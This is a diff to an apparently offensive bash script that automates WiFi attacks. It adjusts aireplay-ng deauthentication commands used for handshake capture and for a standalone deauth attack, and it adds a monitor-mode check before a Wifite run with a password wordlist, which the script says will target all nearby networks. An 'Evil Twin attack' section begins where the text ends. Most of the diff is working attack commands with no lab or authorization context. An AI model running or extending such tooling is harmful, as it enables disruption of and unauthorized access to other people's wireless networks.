@@ -181,7 +181,7 @@ capture_handshake() {
     
     # Send deauth packets (Aggressive Mode)
     log_info "Sending deauth packets..."
-    aireplay-ng --deauth 10 -a "$bssid" -D --ignore-negative-one "$MONITOR_INTERFACE"
+    aireplay-ng --deauth 10 -a "$bssid" --ignore-negative-one "$MONITOR_INTERFACE"
     
     sleep 2
     kill $airodump_pid 2>/dev/null
@@ -197,7 +197,12 @@ auto_attack() {
     log_info "Starting automated WiFi attack with Wifite..."
     log_warning "This will target all nearby networks"
     echo ""
-    
+
+    if ! iwconfig "$MONITOR_INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
+        log_error "Interface $MONITOR_INTERFACE is not in monitor mode. Run --monitor-on first."
+        exit 1
+    fi
+
     wifite --kill \
            --dict "$WORDLIST" \
            --wpa \
@@ -230,8 +235,8 @@ deauth_attack() {
     fi
     echo ""
     
-    # -D disables AP selection check, --ignore-negative-one fixes channel -1 issue
-    aireplay-ng --deauth "$count" -a "$bssid" -D --ignore-negative-one "$MONITOR_INTERFACE"
+    # --ignore-negative-one fixes channel -1 issue
+    aireplay-ng --deauth "$count" -a "$bssid" --ignore-negative-one "$MONITOR_INTERFACE"
 }
 
 # Evil Twin attack
